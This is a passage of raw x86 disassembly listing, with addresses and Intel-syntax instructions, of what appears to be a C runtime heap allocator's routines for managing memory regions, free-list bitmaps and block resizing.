  4269c1:	mov    eax,ds:0x45def8
  4269c6:	mov    eax,DWORD PTR [eax+0x10]
  4269c9:	dec    BYTE PTR [eax+0x43]
  4269cc:	mov    eax,ds:0x45def8
  4269d1:	mov    ecx,DWORD PTR [eax+0x10]
  4269d4:	cmp    BYTE PTR [ecx+0x43],0x0
  4269d8:	jne    0x4269e3
  4269da:	and    DWORD PTR [eax+0x4],0xfffffffe
  4269de:	mov    eax,ds:0x45def8
  4269e3:	cmp    DWORD PTR [eax+0x8],0xffffffff
  4269e7:	jne    0x426a52
  4269e9:	push   ebx
  4269ea:	push   0x0
  4269ec:	push   DWORD PTR [eax+0xc]
  4269ef:	call   esi
  4269f1:	mov    eax,ds:0x45def8
  4269f6:	push   DWORD PTR [eax+0x10]
  4269f9:	push   0x0
  4269fb:	push   DWORD PTR ds:0x45e140
  426a01:	call   DWORD PTR ds:0x42902c
  426a07:	mov    eax,ds:0x45defc
  426a0c:	mov    edx,DWORD PTR ds:0x45df00
  426a12:	lea    eax,[eax+eax*4]
  426a15:	shl    eax,0x2
  426a18:	mov    ecx,eax
  426a1a:	mov    eax,ds:0x45def8
  426a1f:	sub    ecx,eax
  426a21:	lea    ecx,[ecx+edx*1-0x14]
  426a25:	push   ecx
  426a26:	lea    ecx,[eax+0x14]
  426a29:	push   ecx
  426a2a:	push   eax
  426a2b:	call   0x428280
  426a30:	mov    eax,DWORD PTR [ebp+0x8]
  426a33:	add    esp,0xc
  426a36:	dec    DWORD PTR ds:0x45defc
  426a3c:	cmp    eax,DWORD PTR ds:0x45def8
  426a42:	jbe    0x426a48
  426a44:	sub    DWORD PTR [ebp+0x8],0x14
  426a48:	mov    eax,ds:0x45df00
  426a4d:	mov    ds:0x45df08,eax
  426a52:	mov    eax,DWORD PTR [ebp+0x8]
  426a55:	mov    ds:0x45def8,eax
  426a5a:	mov    DWORD PTR ds:0x45df10,edi
  426a60:	pop    ebx
  426a61:	pop    edi
  426a62:	pop    esi
  426a63:	leave  
  426a64:	ret    
  426a65:	mov    eax,ds:0x45defc
  426a6a:	mov    ecx,DWORD PTR ds:0x45df0c
  426a70:	push   edi
  426a71:	xor    edi,edi
  426a73:	cmp    eax,ecx
  426a75:	jne    0x426aab
  426a77:	lea    eax,[ecx+ecx*4+0x50]
  426a7b:	shl    eax,0x2
  426a7e:	push   eax
  426a7f:	push   DWORD PTR ds:0x45df00
  426a85:	push   edi
  426a86:	push   DWORD PTR ds:0x45e140
  426a8c:	call   DWORD PTR ds:0x4290d0
  426a92:	cmp    eax,edi
  426a94:	jne    0x426a9a
  426a96:	xor    eax,eax
  426a98:	pop    edi
  426a99:	ret    
  426a9a:	add    DWORD PTR ds:0x45df0c,0x10
  426aa1:	mov    ds:0x45df00,eax
  426aa6:	mov    eax,ds:0x45defc
  426aab:	mov    ecx,DWORD PTR ds:0x45df00
  426ab1:	push   esi
  426ab2:	push   0x41c4
  426ab7:	push   0x8
  426ab9:	push   DWORD PTR ds:0x45e140
  426abf:	lea    eax,[eax+eax*4]
  426ac2:	lea    esi,[ecx+eax*4]
  426ac5:	call   DWORD PTR ds:0x429030
  426acb:	cmp    eax,edi
  426acd:	mov    DWORD PTR [esi+0x10],eax
  426ad0:	jne    0x426ad6
  426ad2:	xor    eax,eax
  426ad4:	jmp    0x426b19
  426ad6:	push   0x4
  426ad8:	push   0x2000
  426add:	push   0x100000
  426ae2:	push   edi
  426ae3:	call   DWORD PTR ds:0x4290cc
  426ae9:	cmp    eax,edi
  426aeb:	mov    DWORD PTR [esi+0xc],eax
  426aee:	jne    0x426b02
  426af0:	push   DWORD PTR [esi+0x10]
  426af3:	push   edi
  426af4:	push   DWORD PTR ds:0x45e140
  426afa:	call   DWORD PTR ds:0x42902c
  426b00:	jmp    0x426ad2
  426b02:	or     DWORD PTR [esi+0x8],0xffffffff
  426b06:	mov    DWORD PTR [esi],edi
  426b08:	mov    DWORD PTR [esi+0x4],edi
  426b0b:	inc    DWORD PTR ds:0x45defc
  426b11:	mov    eax,DWORD PTR [esi+0x10]
  426b14:	or     DWORD PTR [eax],0xffffffff
  426b17:	mov    eax,esi
  426b19:	pop    esi
  426b1a:	pop    edi
  426b1b:	ret    
  426b1c:	push   ebp
  426b1d:	mov    ebp,esp
  426b1f:	push   ecx
  426b20:	push   ecx
  426b21:	mov    ecx,DWORD PTR [ebp+0x8]
  426b24:	mov    eax,DWORD PTR [ecx+0x8]
  426b27:	push   ebx
  426b28:	push   esi
  426b29:	mov    esi,DWORD PTR [ecx+0x10]
  426b2c:	push   edi
  426b2d:	xor    ebx,ebx
  426b2f:	jmp    0x426b34
  426b31:	shl    eax,1
  426b33:	inc    ebx
  426b34:	test   eax,eax
  426b36:	jge    0x426b31
  426b38:	mov    eax,ebx
  426b3a:	imul   eax,eax,0x204
  426b40:	lea    eax,[eax+esi*1+0x144]
  426b47:	push   0x3f
  426b49:	mov    DWORD PTR [ebp-0x8],eax
  426b4c:	pop    edx
  426b4d:	mov    DWORD PTR [eax+0x8],eax
  426b50:	mov    DWORD PTR [eax+0x4],eax
  426b53:	add    eax,0x8
  426b56:	dec    edx
  426b57:	jne    0x426b4d
  426b59:	push   0x4
  426b5b:	mov    edi,ebx
  426b5d:	push   0x1000
  426b62:	shl    edi,0xf
  426b65:	add    edi,DWORD PTR [ecx+0xc]
  426b68:	push   0x8000
  426b6d:	push   edi
  426b6e:	call   DWORD PTR ds:0x4290cc
  426b74:	test   eax,eax
  426b76:	jne    0x426b80
  426b78:	or     eax,0xffffffff
  426b7b:	jmp    0x426c1d
  426b80:	lea    edx,[edi+0x7000]
  426b86:	cmp    edi,edx
  426b88:	mov    DWORD PTR [ebp-0x4],edx
  426b8b:	ja     0x426bd0
  426b8d:	mov    ecx,edx
  426b8f:	sub    ecx,edi
  426b91:	shr    ecx,0xc
  426b94:	lea    eax,[edi+0x10]
  426b97:	inc    ecx
  426b98:	or     DWORD PTR [eax-0x8],0xffffffff
  426b9c:	or     DWORD PTR [eax+0xfec],0xffffffff
  426ba3:	lea    edx,[eax+0xffc]
  426ba9:	mov    DWORD PTR [eax],edx
  426bab:	lea    edx,[eax-0x1004]
  426bb1:	mov    DWORD PTR [eax-0x4],0xff0
  426bb8:	mov    DWORD PTR [eax+0x4],edx
  426bbb:	mov    DWORD PTR [eax+0xfe8],0xff0
  426bc5:	add    eax,0x1000
  426bca:	dec    ecx
  426bcb:	jne    0x426b98
  426bcd:	mov    edx,DWORD PTR [ebp-0x4]
  426bd0:	mov    eax,DWORD PTR [ebp-0x8]
  426bd3:	add    eax,0x1f8
  426bd8:	lea    ecx,[edi+0xc]
  426bdb:	mov    DWORD PTR [eax+0x4],ecx
  426bde:	mov    DWORD PTR [ecx+0x8],eax
  426be1:	lea    ecx,[edx+0xc]
  426be4:	mov    DWORD PTR [eax+0x8],ecx
  426be7:	mov    DWORD PTR [ecx+0x4],eax
  426bea:	and    DWORD PTR [esi+ebx*4+0x44],0x0
  426bef:	xor    edi,edi
  426bf1:	inc    edi
  426bf2:	mov    DWORD PTR [esi+ebx*4+0xc4],edi
  426bf9:	mov    al,BYTE PTR [esi+0x43]
  426bfc:	mov    cl,al
  426bfe:	inc    cl
  426c00:	test   al,al
  426c02:	mov    eax,DWORD PTR [ebp+0x8]
  426c05:	mov    BYTE PTR [esi+0x43],cl
  426c08:	jne    0x426c0d
  426c0a:	or     DWORD PTR [eax+0x4],edi
  426c0d:	mov    edx,0x80000000
  426c12:	mov    ecx,ebx
  426c14:	shr    edx,cl
  426c16:	not    edx
  426c18:	and    DWORD PTR [eax+0x8],edx
  426c1b:	mov    eax,ebx
  426c1d:	pop    edi
  426c1e:	pop    esi
  426c1f:	pop    ebx
  426c20:	leave  
  426c21:	ret    
  426c22:	push   ebp
  426c23:	mov    ebp,esp
  426c25:	sub    esp,0xc
  426c28:	mov    ecx,DWORD PTR [ebp+0x8]
  426c2b:	mov    eax,DWORD PTR [ecx+0x10]
  426c2e:	push   ebx
  426c2f:	push   esi
  426c30:	mov    esi,DWORD PTR [ebp+0x10]
  426c33:	push   edi
  426c34:	mov    edi,DWORD PTR [ebp+0xc]
  426c37:	mov    edx,edi
  426c39:	sub    edx,DWORD PTR [ecx+0xc]
  426c3c:	add    esi,0x17
  426c3f:	shr    edx,0xf
  426c42:	mov    ecx,edx
  426c44:	imul   ecx,ecx,0x204
  426c4a:	lea    ecx,[ecx+eax*1+0x144]
  426c51:	mov    DWORD PTR [ebp-0xc],ecx
  426c54:	mov    ecx,DWORD PTR [edi-0x4]
  426c57:	and    esi,0xfffffff0
  426c5a:	dec    ecx
  426c5b:	cmp    esi,ecx
  426c5d:	lea    edi,[ecx+edi*1-0x4]
  426c61:	mov    ebx,DWORD PTR [edi]
  426c63:	mov    DWORD PTR [ebp+0x10],ecx
  426c66:	mov    DWORD PTR [ebp-0x4],ebx
  426c69:	jle    0x426dc4
  426c6f:	test   bl,0x1
  426c72:	jne    0x426dbd
  426c78:	add    ebx,ecx
  426c7a:	cmp    esi,ebx
  426c7c:	jg     0x426dbd
  426c82:	mov    ecx,DWORD PTR [ebp-0x4]
  426c85:	sar    ecx,0x4
  426c88:	dec    ecx
  426c89:	cmp    ecx,0x3f
  426c8c:	mov    DWORD PTR [ebp-0x8],ecx
  426c8f:	jbe    0x426c97
  426c91:	push   0x3f
  426c93:	pop    ecx
  426c94:	mov    DWORD PTR [ebp-0x8],ecx
  426c97:	mov    ebx,DWORD PTR [edi+0x4]
  426c9a:	cmp    ebx,DWORD PTR [edi+0x8]
  426c9d:	jne    0x426ce2
  426c9f:	cmp    ecx,0x20
  426ca2:	mov    ebx,0x80000000
  426ca7:	jae    0x426cc3
  426ca9:	shr    ebx,cl
  426cab:	mov    ecx,DWORD PTR [ebp-0x8]
  426cae:	lea    ecx,[ecx+eax*1+0x4]
  426cb2:	not    ebx
  426cb4:	and    DWORD PTR [eax+edx*4+0x44],ebx
  426cb8:	dec    BYTE PTR [ecx]
  426cba:	jne    0x426ce2
  426cbc:	mov    ecx,DWORD PTR [ebp+0x8]
  426cbf:	and    DWORD PTR [ecx],ebx
  426cc1:	jmp    0x426ce2
  426cc3:	add    ecx,0xffffffe0
  426cc6:	shr    ebx,cl
  426cc8:	mov    ecx,DWORD PTR [ebp-0x8]
  426ccb:	lea    ecx,[ecx+eax*1+0x4]
  426ccf:	not    ebx
  426cd1:	and    DWORD PTR [eax+edx*4+0xc4],ebx
  426cd8:	dec    BYTE PTR [ecx]
  426cda:	jne    0x426ce2
  426cdc:	mov    ecx,DWORD PTR [ebp+0x8]
  426cdf:	and    DWORD PTR [ecx+0x4],ebx
  426ce2:	mov    ecx,DWORD PTR [edi+0x8]
  426ce5:	mov    ebx,DWORD PTR [edi+0x4]
  426ce8:	mov    DWORD PTR [ecx+0x4],ebx
  426ceb:	mov    ecx,DWORD PTR [edi+0x4]
  426cee:	mov    edi,DWORD PTR [edi+0x8]
  426cf1:	mov    DWORD PTR [ecx+0x8],edi
  426cf4:	mov    ecx,DWORD PTR [ebp+0x10]
  426cf7:	sub    ecx,esi
  426cf9:	add    DWORD PTR [ebp-0x4],ecx
  426cfc:	cmp    DWORD PTR [ebp-0x4],0x0
  426d00:	jle    0x426dab
  426d06:	mov    edi,DWORD PTR [ebp-0x4]
  426d09:	mov    ecx,DWORD PTR [ebp+0xc]
  426d0c:	sar    edi,0x4
  426d0f:	dec    edi
  426d10:	cmp    edi,0x3f
  426d13:	lea    ecx,[ecx+esi*1-0x4]
  426d17:	jbe    0x426d1c
  426d19:	push   0x3f
  426d1b:	pop    edi
  426d1c:	mov    ebx,DWORD PTR [ebp-0xc]
  426d1f:	lea    ebx,[ebx+edi*8]
  426d22:	mov    DWORD PTR [ebp+0x10],ebx
  426d25:	mov    ebx,DWORD PTR [ebx+0x4]
  426d28:	mov    DWORD PTR [ecx+0x4],ebx
  426d2b:	mov    ebx,DWORD PTR [ebp+0x10]
  426d2e:	mov    DWORD PTR [ecx+0x8],ebx
  426d31:	mov    DWORD PTR [ebx+0x4],ecx
  426d34:	mov    ebx,DWORD PTR [ecx+0x4]
  426d37:	mov    DWORD PTR [ebx+0x8],ecx
  426d3a:	mov    ebx,DWORD PTR [ecx+0x4]
  426d3d:	cmp    ebx,DWORD PTR [ecx+0x8]
  426d40:	jne    0x426d99
  426d42:	mov    cl,BYTE PTR [edi+eax*1+0x4]
  426d46:	mov    BYTE PTR [ebp+0x13],cl
  426d49:	inc    cl
  426d4b:	cmp    edi,0x20
  426d4e:	mov    BYTE PTR [edi+eax*1+0x4],cl
  426d52:	jae    0x426d70
  426d54:	cmp    BYTE PTR [ebp+0x13],0x0
  426d58:	jne    0x426d68
  426d5a:	mov    ecx,edi
  426d5c:	mov    ebx,0x80000000
  426d61:	shr    ebx,cl
  426d63:	mov    ecx,DWORD PTR [ebp+0x8]
  426d66:	or     DWORD PTR [ecx],ebx
  426d68:	lea    eax,[eax+edx*4+0x44]
  426d6c:	mov    ecx,edi
  426d6e:	jmp    0x426d90
  426d70:	cmp    BYTE PTR [ebp+0x13],0x0
  426d74:	jne    0x426d86
  426d76:	lea    ecx,[edi-0x20]
  426d79:	mov    ebx,0x80000000
  426d7e:	shr    ebx,cl
  426d80:	mov    ecx,DWORD PTR [ebp+0x8]
  426d83:	or     DWORD PTR [ecx+0x4],ebx
  426d86:	lea    eax,[eax+edx*4+0xc4]
  426d8d:	lea    ecx,[edi-0x20]
  426d90:	mov    edx,0x80000000
  426d95:	shr    edx,cl
  426d97:	or     DWORD PTR [eax],edx
  426d99:	mov    edx,DWORD PTR [ebp+0xc]
  426d9c:	mov    ecx,DWORD PTR [ebp-0x4]
  426d9f:	lea    eax,[edx+esi*1-0x4]
  426da3:	mov    DWORD PTR [eax],ecx
  426da5:	mov    DWORD PTR [ecx+eax*1-0x4],ecx
  426da9:	jmp    0x426dae
  426dab:	mov    edx,DWORD PTR [ebp+0xc]
  426dae:	lea    eax,[esi+0x1]
  426db1:	mov    DWORD PTR [edx-0x4],eax
  426db4:	mov    DWORD PTR [edx+esi*1-0x8],eax
  426db8:	jmp    0x426ef9
  426dbd:	xor    eax,eax
  426dbf:	jmp    0x426efc
  426dc4:	jge    0x426ef9
  426dca:	mov    ebx,DWORD PTR [ebp+0xc]
  426dcd:	sub    DWORD PTR [ebp+0x10],esi
  426dd0:	lea    ecx,[esi+0x1]
  426dd3:	mov    DWORD PTR [ebx-0x4],ecx
  426dd6:	lea    ebx,[ebx+esi*1-0x4]
  426dda:	mov    esi,DWORD PTR [ebp+0x10]
  426ddd:	sar    esi,0x4
  426de0:	dec    esi
  426de1:	cmp    esi,0x3f
  426de4:	mov    DWORD PTR [ebp+0xc],ebx
  426de7:	mov    DWORD PTR [ebx-0x4],ecx
  426dea:	jbe    0x426def
  426dec:	push   0x3f
  426dee:	pop    esi
  426def:	test   BYTE PTR [ebp-0x4],0x1
  426df3:	jne    0x426e79
  426df9:	mov    esi,DWORD PTR [ebp-0x4]
  426dfc:	sar    esi,0x4
  426dff:	dec    esi
  426e00:	cmp    esi,0x3f
  426e03:	jbe    0x426e08
  426e05:	push   0x3f
  426e07:	pop    esi
  426e08:	mov    ecx,DWORD PTR [edi+0x4]
  426e0b:	cmp    ecx,DWORD PTR [edi+0x8]
  426e0e:	jne    0x426e52
  426e10:	cmp    esi,0x20
  426e13:	mov    ebx,0x80000000
  426e18:	jae    0x426e33
  426e1a:	mov    ecx,esi
  426e1c:	shr    ebx,cl
  426e1e:	lea    esi,[esi+eax*1+0x4]
  426e22:	not    ebx
  426e24:	and    DWORD PTR [eax+edx*4+0x44],ebx
  426e28:	dec    BYTE PTR [esi]
  426e2a:	jne    0x426e4f
  426e2c:	mov    ecx,DWORD PTR [ebp+0x8]
  426e2f:	and    DWORD PTR [ecx],ebx
  426e31:	jmp    0x426e4f
  426e33:	lea    ecx,[esi-0x20]
  426e36:	shr    ebx,cl
  426e38:	lea    ecx,[esi+eax*1+0x4]
  426e3c:	not    ebx
  426e3e:	and    DWORD PTR [eax+edx*4+0xc4],ebx
  426e45:	dec    BYTE PTR [ecx]
  426e47:	jne    0x426e4f
  426e49:	mov    ecx,DWORD PTR [ebp+0x8]
  426e4c:	and    DWORD PTR [ecx+0x4],ebx
  426e4f:	mov    ebx,DWORD PTR [ebp+0xc]
  426e52:	mov    ecx,DWORD PTR [edi+0x8]
  426e55:	mov    esi,DWORD PTR [edi+0x4]
  426e58:	mov    DWORD PTR [ecx+0x4],esi
  426e5b:	mov    esi,DWORD PTR [edi+0x8]
  426e5e:	mov    ecx,DWORD PTR [edi+0x4]
  426e61:	mov    DWORD PTR [ecx+0x8],esi
  426e64:	mov    esi,DWORD PTR [ebp+0x10]
  426e67:	add    esi,DWORD PTR [ebp-0x4]
  426e6a:	mov    DWORD PTR [ebp+0x10],esi
  426e6d:	sar    esi,0x4
  426e70:	dec    esi
  426e71:	cmp    esi,0x3f
  426e74:	jbe    0x426e79
  426e76:	push   0x3f
  426e78:	pop    esi
  426e79:	mov    ecx,DWORD PTR [ebp-0xc]
  426e7c:	lea    ecx,[ecx+esi*8]
  426e7f:	mov    edi,DWORD PTR [ecx+0x4]
  426e82:	mov    DWORD PTR [ebx+0x8],ecx
  426e85:	mov    DWORD PTR [ebx+0x4],edi
  426e88:	mov    DWORD PTR [ecx+0x4],ebx
  426e8b:	mov    ecx,DWORD PTR [ebx+0x4]
  426e8e:	mov    DWORD PTR [ecx+0x8],ebx
  426e91:	mov    ecx,DWORD PTR [ebx+0x4]
  426e94:	cmp    ecx,DWORD PTR [ebx+0x8]
  426e97:	jne    0x426ef0
  426e99:	mov    cl,BYTE PTR [esi+eax*1+0x4]
  426e9d:	mov    BYTE PTR [ebp+0xf],cl
  426ea0:	inc    cl
  426ea2:	cmp    esi,0x20
  426ea5:	mov    BYTE PTR [esi+eax*1+0x4],cl
  426ea9:	jae    0x426ec7
  426eab:	cmp    BYTE PTR [ebp+0xf],0x0
  426eaf:	jne    0x426ebf
  426eb1:	mov    ecx,esi
  426eb3:	mov    edi,0x80000000
  426eb8:	shr    edi,cl
  426eba:	mov    ecx,DWORD PTR [ebp+0x8]
  426ebd:	or     DWORD PTR [ecx],edi
  426ebf:	lea    eax,[eax+edx*4+0x44]
  426ec3:	mov    ecx,esi
  426ec5:	jmp    0x426ee7
  426ec7:	cmp    BYTE PTR [ebp+0xf],0x0
  426ecb:	jne    0x426edd
  426ecd:	lea    ecx,[esi-0x20]
  426ed0:	mov    edi,0x80000000
  426ed5:	shr    edi,cl
  426ed7:	mov    ecx,DWORD PTR [ebp+0x8]
  426eda:	or     DWORD PTR [ecx+0x4],edi
  426edd:	lea    eax,[eax+edx*4+0xc4]
  426ee4:	lea    ecx,[esi-0x20]
  426ee7:	mov    edx,0x80000000
  426eec:	shr    edx,cl
  426eee:	or     DWORD PTR [eax],edx
  426ef0:	mov    eax,DWORD PTR [ebp+0x10]
  426ef3:	mov    DWORD PTR [ebx],eax
  426ef5:	mov    DWORD PTR [eax+ebx*1-0x4],eax
  426ef9:	xor    eax,eax
  426efb:	inc    eax
  426efc:	pop    edi
  426efd:	pop    esi
  426efe:	pop    ebx
  426eff:	leave  
  426f00:	ret    
  426f01:	push   ebp
  426f02:	mov    ebp,esp
  426f04:	sub    esp,0x14
  426f07:	mov    ecx,DWORD PTR [ebp+0x8]
  426f0a:	mov    eax,ds:0x45defc
  426f0f:	mov    edx,DWORD PTR ds:0x45df00
  426f15:	add    ecx,0x17
  426f18:	and    ecx,0xfffffff0
  426f1b:	push   ebx
  426f1c:	mov    DWORD PTR [ebp-0x10],ecx
  426f1f:	sar    ecx,0x4
  426f22:	push   esi
  426f23:	lea    eax,[eax+eax*4]
  426f26:	push   edi
  426f27:	dec    ecx
  426f28:	cmp    ecx,0x20
  426f2b:	lea    edi,[edx+eax*4]
  426f2e:	mov    DWORD PTR [ebp-0x4],edi
  426f31:	jge    0x426f3e
  426f33:	or     esi,0xffffffff
  426f36:	shr    esi,cl
  426f38:	or     DWORD PTR [ebp-0x8],0xffffffff
  426f3c:	jmp    0x426f4b
  426f3e:	add    ecx,0xffffffe0
  426f41:	or     eax,0xffffffff
  426f44:	xor    esi,esi
  426f46:	shr    eax,cl
  426f48:	mov    DWORD PTR [ebp-0x8],eax
  426f4b:	mov    eax,ds:0x45df08
  426f50:	mov    ebx,eax
  426f52:	mov    DWORD PTR [ebp-0xc],esi
  426f55:	cmp    ebx,edi
  426f57:	jmp    0x426f6d
  426f59:	mov    ecx,DWORD PTR [ebx+0x4]
  426f5c:	mov    edi,DWORD PTR [ebx]
  426f5e:	and    ecx,DWORD PTR [ebp-0x8]
  426f61:	and    edi,esi
  426f63:	or     ecx,edi
  426f65:	jne    0x426f72
  426f67:	add    ebx,0x14
  426f6a:	cmp    ebx,DWORD PTR [ebp-0x4]
  426f6d:	mov    DWORD PTR [ebp+0x8],ebx
  426f70:	jb     0x426f59
  426f72:	cmp    ebx,DWORD PTR [ebp-0x4]
  426f75:	jne    0x426f9b
  426f77:	mov    ebx,edx
  426f79:	jmp    0x426f8c
  426f7b:	mov    ecx,DWORD PTR [ebx+0x4]
  426f7e:	mov    edi,DWORD PTR [ebx]
  426f80:	and    ecx,DWORD PTR [ebp-0x8]
  426f83:	and    edi,esi
  426f85:	or     ecx,edi
  426f87:	jne    0x426f93
  426f89:	add    ebx,0x14
  426f8c:	cmp    ebx,eax
  426f8e:	mov    DWORD PTR [ebp+0x8],ebx
  426f91:	jb     0x426f7b
  426f93:	cmp    ebx,eax
  426f95:	je     0x42702f
  426f9b:	mov    DWORD PTR ds:0x45df08,ebx
  426fa1:	mov    eax,DWORD PTR [ebx+0x10]
  426fa4:	mov    edx,DWORD PTR [eax]
  426fa6:	cmp    edx,0xffffffff
  426fa9:	mov    DWORD PTR [ebp-0x4],edx
  426fac:	je     0x426fc2
  426fae:	mov    ecx,DWORD PTR [eax+edx*4+0xc4]
  426fb5:	mov    edi,DWORD PTR [eax+edx*4+0x44]
  426fb9:	and    ecx,DWORD PTR [ebp-0x8]
  426fbc:	and    edi,esi
  426fbe:	or     ecx,edi
  426fc0:	jne    0x426ff8
  426fc2:	mov    edx,DWORD PTR [eax+0xc4]
  426fc8:	and    edx,DWORD PTR [ebp-0x8]
  426fcb:	and    DWORD PTR [ebp-0x4],0x0
  426fcf:	lea    ecx,[eax+0x44]
  426fd2:	mov    esi,DWORD PTR [ecx]
  426fd4:	and    esi,DWORD PTR [ebp-0xc]
  426fd7:	or     edx,esi
  426fd9:	mov    esi,DWORD PTR [ebp-0xc]
  426fdc:	jne    0x426ff5
  426fde:	mov    edx,DWORD PTR [ecx+0x84]
  426fe4:	and    edx,DWORD PTR [ebp-0x8]
  426fe7:	inc    DWORD PTR [ebp-0x4]
  426fea:	add    ecx,0x4
  426fed:	mov    edi,DWORD PTR [ecx]
  426fef:	and    edi,esi
  426ff1:	or     edx,edi
  426ff3:	je     0x426fde
  426ff5:	mov    edx,DWORD PTR [ebp-0x4]
  426ff8:	mov    ecx,edx
  426ffa:	imul   ecx,ecx,0x204
  427000:	lea    ecx,[ecx+eax*1+0x144]
  427007:	mov    DWORD PTR [ebp-0xc],ecx
  42700a:	mov    ecx,DWORD PTR [eax+edx*4+0x44]
  42700e:	xor    edi,edi
  427010:	and    ecx,esi
  427012:	jne    0x427081
  427014:	mov    ecx,DWORD PTR [eax+edx*4+0xc4]
  42701b:	and    ecx,DWORD PTR [ebp-0x8]
  42701e:	push   0x20
  427020:	pop    edi
  427021:	jmp    0x427081
  427023:	cmp    DWORD PTR [ebx+0x8],0x0
  427027:	jne    0x427034
  427029:	add    ebx,0x14
  42702c:	mov    DWORD PTR [ebp+0x8],ebx
  42702f:	cmp    ebx,DWORD PTR [ebp-0x4]
  427032:	jb     0x427023
  427034:	cmp    ebx,DWORD PTR [ebp-0x4]
  427037:	jne    0x42705f
  427039:	mov    ebx,edx
  42703b:	jmp    0x427046
  42703d:	cmp    DWORD PTR [ebx+0x8],0x0
  427041:	jne    0x42704d
  427043:	add    ebx,0x14
  427046:	cmp    ebx,eax
  427048:	mov    DWORD PTR [ebp+0x8],ebx
  42704b:	jb     0x42703d
  42704d:	cmp    ebx,eax
  42704f:	jne    0x42705f
  427051:	call   0x426a65
  427056:	mov    ebx,eax
  427058:	test   ebx,ebx
  42705a:	mov    DWORD PTR [ebp+0x8],ebx
  42705d:	je     0x427077
  42705f:	push   ebx
  427060:	call   0x426b1c
  427065:	pop    ecx
  427066:	mov    ecx,DWORD PTR [ebx+0x10]
  427069:	mov    DWORD PTR [ecx],eax
  42706b:	mov    eax,DWORD PTR [ebx+0x10]
  42706e:	cmp    DWORD PTR [eax],0xffffffff
  427071:	jne    0x426f9b
  427077:	xor    eax,eax
  427079:	jmp    0x4271f8
  42707e:	shl    ecx,1
  427080:	inc    edi
  427081:	test   ecx,ecx
  427083:	jge    0x42707e
  427085:	mov    ecx,DWORD PTR [ebp-0xc]
  427088:	mov    edx,DWORD PTR [ecx+edi*8+0x4]
  42708c:	mov    ecx,DWORD PTR [edx]
  42708e:	sub    ecx,DWORD PTR [ebp-0x10]
  427091:	mov    esi,ecx
  427093:	sar    esi,0x4
  427096:	dec    esi
  427097:	cmp    esi,0x3f
  42709a:	mov    DWORD PTR [ebp-0x8],ecx
  42709d:	jle    0x4270a2
  42709f:	push   0x3f
  4270a1:	pop    esi
  4270a2:	cmp    esi,edi
  4270a4:	je     0x4271ab
  4270aa:	mov    ecx,DWORD PTR [edx+0x4]
  4270ad:	cmp    ecx,DWORD PTR [edx+0x8]
  4270b0:	jne    0x42710e
  4270b2:	cmp    edi,0x20
  4270b5:	mov    ebx,0x80000000
  4270ba:	jge    0x4270e2
  4270bc:	mov    ecx,edi
  4270be:	shr    ebx,cl
  4270c0:	mov    ecx,DWORD PTR [ebp-0x4]
  4270c3:	lea    edi,[eax+edi*1+0x4]
  4270c7:	not    ebx
  4270c9:	mov    DWORD PTR [ebp-0x14],ebx
  4270cc:	and    ebx,DWORD PTR [eax+ecx*4+0x44]
  4270d0:	mov    DWORD PTR [eax+ecx*4+0x44],ebx
  4270d4:	dec    BYTE PTR [edi]
  4270d6:	jne    0x42710b
  4270d8:	mov    ecx,DWORD PTR [ebp-0x14]
  4270db:	mov    ebx,DWORD PTR [ebp+0x8]
  4270de:	and    DWORD PTR [ebx],ecx
  4270e0:	jmp    0x42710e
  4270e2:	lea    ecx,[edi-0x20]
  4270e5:	shr    ebx,cl
  4270e7:	mov    ecx,DWORD PTR [ebp-0x4]
  4270ea:	lea    ecx,[eax+ecx*4+0xc4]
  4270f1:	lea    edi,[eax+edi*1+0x4]
  4270f5:	not    ebx
  4270f7:	and    DWORD PTR [ecx],ebx
  4270f9:	dec    BYTE PTR [edi]
  4270fb:	mov    DWORD PTR [ebp-0x14],ebx
  4270fe:	jne    0x42710b
  427100:	mov    ebx,DWORD PTR [ebp+0x8]
  427103:	mov    ecx,DWORD PTR [ebp-0x14]
  427106:	and    DWORD PTR [ebx+0x4],ecx
  427109:	jmp    0x42710e
  42710b:	mov    ebx,DWORD PTR [ebp+0x8]
  42710e:	cmp    DWORD PTR [ebp-0x8],0x0
  427112:	mov    ecx,DWORD PTR [edx+0x8]
  427115:	mov    edi,DWORD PTR [edx+0x4]
  427118:	mov    DWORD PTR [ecx+0x4],edi
  42711b:	mov    ecx,DWORD PTR [edx+0x4]
  42711e:	mov    edi,DWORD PTR [edx+0x8]
  427121:	mov    DWORD PTR [ecx+0x8],edi
  427124:	je     0x4271b7
  42712a:	mov    ecx,DWORD PTR [ebp-0xc]
  42712d:	lea    ecx,[ecx+esi*8]
  427130:	mov    edi,DWORD PTR [ecx+0x4]
  427133:	mov    DWORD PTR [edx+0x8],ecx
  427136:	mov    DWORD PTR [edx+0x4],edi
  427139:	mov    DWORD PTR [ecx+0x4],edx
  42713c:	mov    ecx,DWORD PTR [edx+0x4]
  42713f:	mov    DWORD PTR [ecx+0x8],edx
  427142:	mov    ecx,DWORD PTR [edx+0x4]
  427145:	cmp    ecx,DWORD PTR [edx+0x8]
  427148:	jne    0x4271a8
  42714a:	mov    cl,BYTE PTR [esi+eax*1+0x4]
  42714e:	mov    BYTE PTR [ebp+0xb],cl
  427151:	inc    cl
  427153:	cmp    esi,0x20
  427156:	mov    BYTE PTR [esi+eax*1+0x4],cl
  42715a:	jge    0x42717f
  42715c:	cmp    BYTE PTR [ebp+0xb],0x0
  427160:	jne    0x42716d
  427162:	mov    edi,0x80000000
  427167:	mov    ecx,esi
  427169:	shr    edi,cl
  42716b:	or     DWORD PTR [ebx],edi
  42716d:	mov    ecx,esi
  42716f:	mov    edi,0x80000000
  427174:	shr    edi,cl
  427176:	mov    ecx,DWORD PTR [ebp-0x4]
  427179:	or     DWORD PTR [eax+ecx*4+0x44],edi
  42717d:	jmp    0x4271a8
  42717f:	cmp    BYTE PTR [ebp+0xb],0x0
  427183:	jne    0x427192
  427185:	lea    ecx,[esi-0x20]
  427188:	mov    edi,0x80000000
  42718d:	shr    edi,cl
  42718f:	or     DWORD PTR [ebx+0x4],edi
  427192:	mov    ecx,DWORD PTR [ebp-0x4]
  427195:	lea    edi,[eax+ecx*4+0xc4]
  42719c:	lea    ecx,[esi-0x20]
  42719f:	mov    esi,0x80000000
  4271a4:	shr    esi,cl
  4271a6:	or     DWORD PTR [edi],esi
  4271a8:	mov    ecx,DWORD PTR [ebp-0x8]
  4271ab:	test   ecx,ecx
  4271ad:	je     0x4271ba
  4271af:	mov    DWORD PTR [edx],ecx
  4271b1:	mov    DWORD PTR [ecx+edx*1-0x4],ecx
  4271b5:	jmp    0x4271ba
  4271b7:	mov    ecx,DWORD PTR [ebp-0x8]
  4271ba:	mov    esi,DWORD PTR [ebp-0x10]
